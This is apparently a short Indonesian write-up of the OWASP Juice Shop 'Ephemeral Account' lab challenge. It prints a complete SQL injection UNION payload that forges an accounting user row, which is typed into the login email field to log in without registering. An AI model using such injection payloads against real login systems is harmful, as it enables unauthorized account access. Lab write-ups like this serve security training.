# Ephemeral Account

Link Resource: https://juice-shop.herokuapp.com/#/score-board?categories=Injection&showDisabledChallenges=false

### Jawaban

1. Mencari tahu bagaimana database untuk users
<img width="1838" height="1038" alt="image" src="https://github.com/user-attachments/assets/5ebb5a46-dcd8-4e20-a839-bef21adcad80" />

2. Membuat payload `' UNION SELECT * FROM (SELECT 20 AS `id`, 'acc0unt4nt@juice-sh.op' AS `username`, 'acc0unt4nt@juice-sh.op' AS `email`, 'test1234' AS `password`, 'accounting' AS `role`, '123' AS `deluxeToken`, '1.2.3.4' AS `lastLoginIp`, '/assets/public/images/uploads/default.svg' AS `profileImage`, '' AS `totpSecret`, 1 AS `isActive`, 12983283 AS `createdAt`, 133424 AS `updatedAt`, NULL AS `deletedAt`) AS tmp WHERE '1'='1';--` lalu dimasukkan ke bagian email dan login berhasil tanpa perlu register
<img width="1820" height="1035" alt="image" src="https://github.com/user-attachments/assets/fa2e797c-5d45-44f0-80b1-fc8cb4af7a53" />

<img width="894" height="837" alt="image" src="https://github.com/user-attachments/assets/3449aef9-5ccc-448f-b290-8a04bb817286" />

<img width="2004" height="83" alt="image" src="https://github.com/user-attachments/assets/da04c3e2-c3cc-45c9-92a7-c390d22ea5b6" />
